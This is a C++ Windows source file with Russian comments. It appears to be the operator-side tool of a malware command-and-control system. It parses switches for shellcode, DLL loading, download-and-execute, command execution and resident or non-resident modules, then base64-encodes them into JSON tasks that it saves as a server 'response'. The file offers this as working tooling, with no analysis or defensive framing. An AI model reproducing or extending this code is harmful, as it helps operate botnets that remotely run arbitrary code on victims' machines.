#include "global.hpp"
#include "json_builder.hpp"


BOOL Dump2File(PWCHAR wchName, LPBYTE lpData, SIZE_T dwSize)
{
	HANDLE hFile = CreateFileW(wchName, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;

	DWORD dwWritten;
	BOOL bRet = WriteFile(hFile, lpData, dwSize, &dwWritten, 0);

	CloseHandle(hFile);

	return bRet;
}

static BOOL is_wchNumber(PWCHAR pwStr)
{
	if ((pwStr == nullptr) || (*pwStr == L'\0'))
		return FALSE;

	for (SIZE_T i = 0; i < wcslen(pwStr); i++)
	{
		// если не цифра в панике съебываем
		if (!((pwStr[i] >= L'0') && (pwStr[i] <= L'9')))
			return FALSE;
	}

	return TRUE;
}

// возвращает указатель на операнд, например --fast=10 вернет на 10, в --path="C:\database" вернет на "C:\database"
static PWCHAR get_ptr_operand(PWCHAR pwCommand)
{
	SetLastError(ERROR_SUCCESS);
	while (*pwCommand != L'=')
	{
		if ((*pwCommand == L'\0') || (*pwCommand == L' '))
		{
			// неверный синтаксис команды, встретили либо конец строки, либо пробел
			SetLastError(ERROR_INVALID_PARAMETER);
			return nullptr;
		}
		pwCommand++;
	}
	pwCommand++;
	return pwCommand;
}
// парсит число из например --fast=10 вернет 10
static UINT get_number_param(PWCHAR pwCommand)
{
	WCHAR strNumber[64];
	RtlSecureZeroMemory(strNumber, sizeof(strNumber));

	pwCommand = get_ptr_operand(pwCommand);
	if (pwCommand == nullptr)
		return 0;

	// скопируем данные которые идут после равно
	int i = 0;
	while ((*pwCommand != L'\0') && (*pwCommand != L' ') && (*pwCommand != L'\"'))
	{
		strNumber[i++] = *pwCommand;
		pwCommand++;
	}
	strNumber[i] = L'\0';

	// если не число выбьем ошибку
	if (!is_wchNumber(strNumber))
		SetLastError(ERROR_INVALID_PARAMETER);

	return _wtoi(strNumber);
}

// возвращает в новыделенной памяти строку содержащуюся после равно между "
// --path="C:\\hueta" -> C:\\hueta
// --ext="ext;ext2" -> ext;ext2
PWCHAR get_str_operand(PWCHAR pwCommand)
{
	pwCommand = get_ptr_operand(pwCommand);
	if (pwCommand == nullptr)
		return 0;

	if (pwCommand[0] != L'\"')
	{
		SetLastError(ERROR_INVALID_PARAMETER);
		return nullptr;
	}
	pwCommand++;
	PWCHAR pEndData = pwCommand;

	while ((*pEndData != L'\"') && (*pEndData != L'\0'))
		pEndData++;

	// нет завершителя
	if (*pEndData == L'\0')
	{
		SetLastError(ERROR_INVALID_PARAMETER);
		return nullptr;
	}

	SIZE_T dwStringSize = pEndData - pwCommand + 1;
	PWCHAR pwResult = new WCHAR[dwStringSize + 1];
	RtlSecureZeroMemory(pwResult, dwStringSize * 2 + 2);

	UINT i = 0;
	while (pwCommand != pEndData)
	{
		pwResult[i++] = *pwCommand;
		pwCommand++;
	}

	return pwResult;
}

// десериализует строку вида ext1;ext2;ext3 в out, кладя в указатель - адрес аллоцированного буфера с указателями, а в размер - кол-во элементов * sizeof(PWCHAR)
VOID deserialize_array(PWCHAR pwArray, blob *out)
{
	UINT uCount = 1;
	UINT uStrLen = wcslen(pwArray);

	for (UINT i = 0; i < uStrLen; i++)
	{
		if (pwArray[i] == L';')
			uCount++; // каждый делитиметер - +1 расширение, начиная с дефолтной единички, т.е ext1;ext - два элемента, хотя ; один
	}

	out->dwBufferSize = sizeof(PWCHAR) * uCount;
	out->lpBuffer = (LPBYTE)new PWCHAR[uCount]; // выделим буффер с указателями

	PWCHAR *pwOutputArray = (PWCHAR*)out->lpBuffer;
	do
	{
		if (pwOutputArray == nullptr)
			break;

		if (uCount == 1)
		{
			pwOutputArray[0] = new WCHAR[wcslen(pwArray) + 1];
			wcscpy(pwOutputArray[0], pwArray); // если он один, то тупо скопируем сразу всю строку
			break;
		}

		// если не один, то пропарсим в цикле оставшееся

		BOOL bLast = FALSE; // установим в тру когда найдем что это последний элемент для пропарса
		UINT uElementCount = 0;
		do
		{
			PWCHAR pwEnd = wcsstr(pwArray, L";");
			if (pwEnd == nullptr) // так как не удается найти ; то слава аллаху это у нас последний элемент
			{
				bLast = TRUE;
				pwOutputArray[uElementCount] = new WCHAR[wcslen(pwArray) + 1];
				wcscpy(pwOutputArray[uElementCount], pwArray); // скопируем остаток
			}
			else // иначе это не последний элемент, так что сделаем экстрактор оттудова
			{
				UINT uElementSize = pwEnd - pwArray; // размер элемента - это адрес его конца - его начала
				pwOutputArray[uElementCount] = new WCHAR[uElementSize + 1];
				RtlSecureZeroMemory(pwOutputArray[uElementCount], uElementSize * 2 + 2);
				memcpy(pwOutputArray[uElementCount], pwArray, uElementSize * sizeof(WCHAR));

				pwArray = &pwEnd[1]; // возьмем следующий элемент для пропарса
			}

			uElementCount++;
		} while (!bLast);


	} while (FALSE);


	return;
}

void free_arrayptr(blob *pbArray)
{
	if (pbArray->dwBufferSize < sizeof(LPBYTE))
		return;
	
	UINT iPtrs = pbArray->dwBufferSize / sizeof(LPBYTE);
	LPBYTE *lpPtrs = (LPBYTE*)pbArray->lpBuffer;
	if (lpPtrs == nullptr)
		return;

	for (UINT i = 0; i < iPtrs; i++)
	{
		LPBYTE lpPtr = lpPtrs[i];
		if (lpPtr != nullptr)
		{
			delete[]lpPtr;
			lpPtrs[i] = nullptr;
		}
	}

	delete[]lpPtrs;
	RtlSecureZeroMemory(pbArray, sizeof(blob));

	return;
}
void free_commandline(commandline_params *cmd)
{
	free_arrayptr(&cmd->cmdexec);
	free_arrayptr(&cmd->dllloader);
	free_arrayptr(&cmd->downloadexec);
	free_arrayptr(&cmd->nonresident_module);
	free_arrayptr(&cmd->resident_module);
	free_arrayptr(&cmd->shellcode);
}

BOOL deserialize_commandline(PWCHAR pwCommandLine, commandline_params *cmd)
{

	if (wcsstr(pwCommandLine, L"--shellcode"))
	{
		PWCHAR pwArrayData = get_str_operand(wcsstr(pwCommandLine, L"--shellcode"));
		if ((pwArrayData == nullptr) || (GetLastError() == ERROR_INVALID_PARAMETER))
		{
			printf("Invalid --shellcode switch, dying..\n");
			return FALSE;
		}

		deserialize_array(pwArrayData, &cmd->shellcode);
		delete[]pwArrayData;
	}

	if (wcsstr(pwCommandLine, L"--nonresident"))
	{
		PWCHAR pwArrayData = get_str_operand(wcsstr(pwCommandLine, L"--nonresident"));
		if ((pwArrayData == nullptr) || (GetLastError() == ERROR_INVALID_PARAMETER))
		{
			printf("Invalid --nonresident switch, dying..\n");
			return FALSE;
		}

		deserialize_array(pwArrayData, &cmd->nonresident_module);
		delete[]pwArrayData;
	}

	if (wcsstr(pwCommandLine, L"--resident"))
	{
		PWCHAR pwArrayData = get_str_operand(wcsstr(pwCommandLine, L"--resident"));
		if ((pwArrayData == nullptr) || (GetLastError() == ERROR_INVALID_PARAMETER))
		{
			printf("Invalid --resident switch, dying..\n");
			return FALSE;
		}

		deserialize_array(pwArrayData, &cmd->resident_module);
		delete[]pwArrayData;
	}

	if (wcsstr(pwCommandLine, L"--downloadexec"))
	{
		PWCHAR pwArrayData = get_str_operand(wcsstr(pwCommandLine, L"--downloadexec"));
		if ((pwArrayData == nullptr) || (GetLastError() == ERROR_INVALID_PARAMETER))
		{
			printf("Invalid --downloadexec switch, dying..\n");
			return FALSE;
		}

		deserialize_array(pwArrayData, &cmd->downloadexec);
		delete[]pwArrayData;
	}

	if (wcsstr(pwCommandLine, L"--cmdexec"))
	{
		PWCHAR pwArrayData = get_str_operand(wcsstr(pwCommandLine, L"--cmdexec"));
		if ((pwArrayData == nullptr) || (GetLastError() == ERROR_INVALID_PARAMETER))
		{
			printf("Invalid --cmdexec switch, dying..\n");
			return FALSE;
		}

		deserialize_array(pwArrayData, &cmd->cmdexec);
		delete[]pwArrayData;
	}

	if (wcsstr(pwCommandLine, L"--dllloader"))
	{
		PWCHAR pwArrayData = get_str_operand(wcsstr(pwCommandLine, L"--dllloader"));
		if ((pwArrayData == nullptr) || (GetLastError() == ERROR_INVALID_PARAMETER))
		{
			printf("Invalid --dllloader switch, dying..\n");
			return FALSE;
		}

		deserialize_array(pwArrayData, &cmd->dllloader);
		delete[]pwArrayData;
	}

	return TRUE;
}

DWORD align(DWORD n, DWORD a)
{
	if (n % a == 0)
		return n;
	DWORD r = (n / a) * a + a;
	return r;
}



SIZE_T dwBase64MaxLen(DWORD dwLen)
{
	if (dwLen != 0)
		return align((dwLen / 3 * 4), 3);
	
	return 0;
}

size_t _cdecl wcslen_inbytes(wchar_t *pwStr)
{
	UINT uRet = wcslen(pwStr) * 2 + 2;
	printf("wcstr size in bytes %S = %d\n", pwStr, uRet);
	return uRet;
}

size_t _cdecl m_GetFileSize(wchar_t *pwFileName)
{
	DWORD dwRet = 0;

	HANDLE hFile = INVALID_HANDLE_VALUE;
	do
	{
		hFile = CreateFileW(pwFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			printf("Error cant open file %S\n", pwFileName);
			break;
		}

		dwRet = GetFileSize(hFile, NULL);

		printf("File size %S = %d bytes\n", pwFileName, dwRet);

	} while (FALSE);

	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);

	return dwRet;
}

typedef size_t(_cdecl *fnCallbackSizeCalc)(wchar_t *str);

SIZE_T calc_sizestr(PWCHAR *pwPtrArray, UINT uAmount, fnCallbackSizeCalc callback)
{
	SIZE_T dwRet = 0;

	do
	{
		if (pwPtrArray == nullptr)
			break;
		if (uAmount == 0)
			break;
		
		for (UINT i = 0; i < uAmount; i++)
		{
			if (pwPtrArray[i] != nullptr)
				dwRet += dwBase64MaxLen(callback(pwPtrArray[i]));
		}

	} while (FALSE);

	return dwRet;
}


SIZE_T get_max_size(commandline_params *cmd)
{
	SIZE_T dwResult = 0;

	if ((cmd->cmdexec.lpBuffer != nullptr) && (cmd->cmdexec.dwBufferSize >= sizeof(PWCHAR)))
		dwResult += calc_sizestr((PWCHAR*)cmd->cmdexec.lpBuffer, cmd->cmdexec.dwBufferSize / sizeof(PWCHAR), (fnCallbackSizeCalc)wcslen_inbytes);

	if ((cmd->dllloader.lpBuffer != nullptr) && (cmd->dllloader.dwBufferSize >= sizeof(PWCHAR)))
		dwResult += calc_sizestr((PWCHAR*)cmd->dllloader.lpBuffer, cmd->dllloader.dwBufferSize / sizeof(PWCHAR), (fnCallbackSizeCalc)m_GetFileSize);

	if ((cmd->downloadexec.lpBuffer != nullptr) && (cmd->downloadexec.dwBufferSize >= sizeof(PWCHAR)))
		dwResult += calc_sizestr((PWCHAR*)cmd->downloadexec.lpBuffer, cmd->downloadexec.dwBufferSize / sizeof(PWCHAR), (fnCallbackSizeCalc)m_GetFileSize);

	if ((cmd->nonresident_module.lpBuffer != nullptr) && (cmd->nonresident_module.dwBufferSize >= sizeof(PWCHAR)))
		dwResult += calc_sizestr((PWCHAR*)cmd->nonresident_module.lpBuffer, cmd->nonresident_module.dwBufferSize / sizeof(PWCHAR), (fnCallbackSizeCalc)m_GetFileSize);

	if ((cmd->resident_module.lpBuffer != nullptr) && (cmd->resident_module.dwBufferSize >= sizeof(PWCHAR)))
		dwResult += calc_sizestr((PWCHAR*)cmd->resident_module.lpBuffer, cmd->resident_module.dwBufferSize / sizeof(PWCHAR), (fnCallbackSizeCalc)m_GetFileSize);
	
	if ((cmd->shellcode.lpBuffer != nullptr) && (cmd->shellcode.dwBufferSize >= sizeof(PWCHAR)))
		dwResult += calc_sizestr((PWCHAR*)cmd->shellcode.lpBuffer, cmd->shellcode.dwBufferSize / sizeof(PWCHAR), (fnCallbackSizeCalc)m_GetFileSize);

	return dwResult + 1024;
}

UINT get_operation_amount(commandline_params *cmd)
{
	UINT iResult = 0;

	if ((cmd->cmdexec.lpBuffer != nullptr) && (cmd->cmdexec.dwBufferSize >= sizeof(PWCHAR)))
		iResult += cmd->cmdexec.dwBufferSize / sizeof(PWCHAR);

	if ((cmd->dllloader.lpBuffer != nullptr) && (cmd->dllloader.dwBufferSize >= sizeof(PWCHAR)))
		iResult += cmd->dllloader.dwBufferSize / sizeof(PWCHAR);

	if ((cmd->downloadexec.lpBuffer != nullptr) && (cmd->downloadexec.dwBufferSize >= sizeof(PWCHAR)))
		iResult += cmd->downloadexec.dwBufferSize / sizeof(PWCHAR);

	if ((cmd->nonresident_module.lpBuffer != nullptr) && (cmd->nonresident_module.dwBufferSize >= sizeof(PWCHAR)))
		iResult += cmd->nonresident_module.dwBufferSize / sizeof(PWCHAR);

	if ((cmd->resident_module.lpBuffer != nullptr) && (cmd->resident_module.dwBufferSize >= sizeof(PWCHAR)))
		iResult += cmd->resident_module.dwBufferSize / sizeof(PWCHAR);

	if ((cmd->shellcode.lpBuffer != nullptr) && (cmd->shellcode.dwBufferSize >= sizeof(PWCHAR)))
		iResult += cmd->shellcode.dwBufferSize / sizeof(PWCHAR);


	return iResult;
}

PWCHAR GetBase64FromBytes(LPBYTE lpBuffer, SIZE_T dwBufferSize)
{
	PWCHAR pwBase64 = nullptr;
	SIZE_T dwRequiredSize = 0;

	if (!CryptBinaryToStringW(lpBuffer, dwBufferSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &dwRequiredSize))
	{
		return nullptr;
	}

	pwBase64 = new WCHAR[dwRequiredSize + 1];
	if (!CryptBinaryToStringW(lpBuffer, dwBufferSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, pwBase64, &dwRequiredSize))
	{
		delete[]pwBase64;
		return nullptr;
	}

	return pwBase64;
}

PWCHAR GetBase64Data(PWCHAR pwchName, BOOL bDataIsFile)
{
	PWCHAR pwResult = nullptr;

	if (!bDataIsFile)
	{
		pwResult = GetBase64FromBytes((LPBYTE)pwchName, wcslen_inbytes(pwchName));
	}
	else
	{
		blob bFile;
		RtlSecureZeroMemory(&bFile, sizeof(bFile));
		HANDLE hFile = INVALID_HANDLE_VALUE;
		do
		{
			hFile = CreateFileW(pwchName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
			if (hFile == INVALID_HANDLE_VALUE)
			{
				printf("Cant open file for base64: %S\n", pwchName);
				break;
			}
			bFile.dwBufferSize = GetFileSize(hFile, NULL);
			bFile.lpBuffer = new BYTE[bFile.dwBufferSize + 1];

			if ((bFile.lpBuffer == nullptr) || (!ReadFile(hFile, bFile.lpBuffer, bFile.dwBufferSize, &bFile.dwBufferSize, NULL)))
			{
				printf("Cant either read of alloc buffer for reading %S\n", pwchName);
				break;
			}

			pwResult = GetBase64FromBytes(bFile.lpBuffer, bFile.dwBufferSize);

		} while (FALSE);

		if (hFile != INVALID_HANDLE_VALUE)
			CloseHandle(hFile);
		if (bFile.lpBuffer != nullptr)
		{
			delete[]bFile.lpBuffer;
			RtlSecureZeroMemory(&bFile, sizeof(bFile));
		}
	}

	return pwResult;
}

// bDataIsFile - в массиве имена файлов откуда читать байты, иначе сами элементы массива и есть команды
PWCHAR create_operation_subjson(PWCHAR pwchOpName, PWCHAR pwchType, blob *pbArray, UINT uMaxJsonSize, BOOL bDataIsFile)
{
	if ((pbArray == nullptr) || (pbArray->lpBuffer == nullptr) || (pbArray->dwBufferSize < sizeof(PWCHAR)))
	{
		printf("Shit data in pbArray for %S %S\n", pwchType, pwchOpName);
		return nullptr;
	}

	PWCHAR pwOperationsJson = new WCHAR[uMaxJsonSize + 1];
	if (pwOperationsJson == nullptr) // сюда JsonBuilder в цикле с запятыми 
		return nullptr;

	WCHAR wchCid[512 + 1];

	UINT uOpAmount = pbArray->dwBufferSize / sizeof(PWCHAR);
	PWCHAR *pwOpDataArray = (PWCHAR*)pbArray->lpBuffer;
	JsonBuilder *jbuilder = nullptr;
	
	RtlSecureZeroMemory(pwOperationsJson, sizeof(WCHAR) * (uMaxJsonSize + 1));
	for (UINT i = 0; i < uOpAmount; i++)
	{
		if (jbuilder != nullptr)
		{
			delete jbuilder;
			jbuilder = nullptr;
		}

		jbuilder = new JsonBuilder;
		if ((jbuilder == nullptr) || (!jbuilder->init(uMaxJsonSize)))
		{
			printf("Error allocating or initializing json builder\n");
			continue;
		}

		PWCHAR pwchBase64 = GetBase64Data(pwOpDataArray[i], bDataIsFile);
		if (pwchBase64)
		{
			wsprintfW(wchCid, L"%x", rand());
			jbuilder->add(L"op", pwchOpName);
			jbuilder->add(L"type", pwchType);
			jbuilder->add(L"cid", wchCid);
			jbuilder->add(L"data", pwchBase64);
			PWCHAR pwBuildOpJson = jbuilder->finish(); // в деструкторе освободится

			wcscat(pwOperationsJson, pwBuildOpJson);
			if (i + 1 != uOpAmount)
				wcscat(pwOperationsJson, L", "); // не последняя операция

			delete[]pwchBase64;
		}
		else
			printf("Error getting base64 from %S\n", pwOpDataArray[i]);
	}

	if (jbuilder != nullptr)
	{
		delete jbuilder;
		jbuilder = nullptr;
	}

	printf("Operations json: %S\n", pwOperationsJson);

	return pwOperationsJson;
}

VOID add_subsid(PWCHAR pwchOpName, PWCHAR pwchType, blob *pbArray, UINT uMaxJsonSize, BOOL DataIsFile, PWCHAR pwchResult, PUINT piSubSid)
{
	PWCHAR pwchSubsidiaryJson = create_operation_subjson(pwchOpName, pwchType, pbArray, uMaxJsonSize, DataIsFile);
	if (pwchSubsidiaryJson != nullptr)
	{
		if (*piSubSid > 0)
			wcscat(pwchResult, L", ");
		wcscat(pwchResult, pwchSubsidiaryJson);
		delete[]pwchSubsidiaryJson;
		(*piSubSid) += 1;
	}

	return;
}


PCHAR Convert2UTF8(PWCHAR pwStr, SIZE_T dwLen)
{
	int utf8_len = WideCharToMultiByte(CP_UTF8, 0, pwStr, dwLen, NULL, 0, NULL, NULL);
	if (utf8_len == 0)
		return nullptr;

	PCHAR pResult = new CHAR[utf8_len + 1];
	if (pResult == nullptr)
		return nullptr;

	RtlSecureZeroMemory(pResult, utf8_len + 1);

	WideCharToMultiByte(CP_UTF8, 0, pwStr, dwLen, pResult, utf8_len, 0, 0);

	return pResult;
}

BOOL create_json(commandline_params *cmd, blob *chJson)
{
	UINT uMaxJsonSize = get_max_size(cmd);
	UINT uOpAmount = get_operation_amount(cmd);
	printf("Json max size = %d\nOperations amount = %d\n", uMaxJsonSize, uOpAmount);

	BOOL bRet = FALSE;

	PWCHAR pwchJsonResult = new WCHAR[uMaxJsonSize + 1];
	if (pwchJsonResult == nullptr)
	{
		printf("Error allocating pwchJsonResult\n");
		return FALSE;
	}

	RtlSecureZeroMemory(pwchJsonResult, sizeof(WCHAR) * (uMaxJsonSize + 1));

	UINT iSubSid = 0;
	if ((cmd->cmdexec.lpBuffer != nullptr) && (cmd->cmdexec.dwBufferSize >= sizeof(PWCHAR)))
		add_subsid(L"command", L"ce", &cmd->cmdexec, uMaxJsonSize, FALSE, pwchJsonResult, &iSubSid);

	if ((cmd->dllloader.lpBuffer != nullptr) && (cmd->dllloader.dwBufferSize >= sizeof(PWCHAR)))
		add_subsid(L"command", L"dl", &cmd->dllloader, uMaxJsonSize, TRUE, pwchJsonResult, &iSubSid);

	if ((cmd->downloadexec.lpBuffer != nullptr) && (cmd->downloadexec.dwBufferSize >= sizeof(PWCHAR)))
		add_subsid(L"command", L"de", &cmd->downloadexec, uMaxJsonSize, TRUE, pwchJsonResult, &iSubSid);

	if ((cmd->shellcode.lpBuffer != nullptr) && (cmd->shellcode.dwBufferSize >= sizeof(PWCHAR)))
		add_subsid(L"command", L"sc", &cmd->shellcode, uMaxJsonSize, TRUE, pwchJsonResult, &iSubSid);

	if ((cmd->nonresident_module.lpBuffer != nullptr) && (cmd->nonresident_module.dwBufferSize >= sizeof(PWCHAR)))
		add_subsid(L"module", L"fl", &cmd->nonresident_module, uMaxJsonSize, TRUE, pwchJsonResult, &iSubSid);

	if ((cmd->resident_module.lpBuffer != nullptr) && (cmd->resident_module.dwBufferSize >= sizeof(PWCHAR)))
		add_subsid(L"module", L"ps", &cmd->resident_module, uMaxJsonSize, TRUE, pwchJsonResult, &iSubSid);

	chJson->dwBufferSize = wcslen(pwchJsonResult) + 1;
	chJson->lpBuffer = (LPBYTE)Convert2UTF8(pwchJsonResult, chJson->dwBufferSize);
	if (chJson->lpBuffer)
		bRet = TRUE;

	if (pwchJsonResult != nullptr)
		delete[]pwchJsonResult;

	return bRet;
}

PCHAR result_json(PCHAR pchOperationArray)
{
	PCHAR pchResultJson = new CHAR[strlen(pchOperationArray) + 1024];
	if (pchResultJson)
	{
		wsprintfA(pchResultJson, "{\"array\": [");
		strcat(pchResultJson, pchOperationArray);
		strcat(pchResultJson, "]}");
	}
	return pchResultJson;
}

int main()
{
	srand(GetTickCount());

	commandline_params cmd;
	blob chJson;
	RtlSecureZeroMemory(&chJson, sizeof(chJson));
	RtlSecureZeroMemory(&cmd, sizeof(cmd));


	PWCHAR pwCommandLine = GetCommandLineW();
	if (pwCommandLine == nullptr)
		return 0;

	PCHAR pchResult = nullptr;
	do
	{
		if (!deserialize_commandline(pwCommandLine, &cmd))
			break;

		if (!create_json(&cmd, &chJson))
			break;

		pchResult = result_json((PCHAR)chJson.lpBuffer);
		if (pchResult == nullptr)
			break;

		printf("RESPONSE: %s\n", pchResult);

		if (Dump2File(L"response.bin", (LPBYTE)pchResult, strlen(pchResult) + 1))
			printf("Succesfully saved to response.bin\n");
		else
			printf("Error saving to response.bin");

	} while (FALSE);

	free_commandline(&cmd);

	if (chJson.lpBuffer != nullptr)
	{
		delete[]chJson.lpBuffer;
		RtlSecureZeroMemory(&chJson, sizeof(chJson));
	}

	if (pchResult)
		delete[]pchResult;

	return 0;
}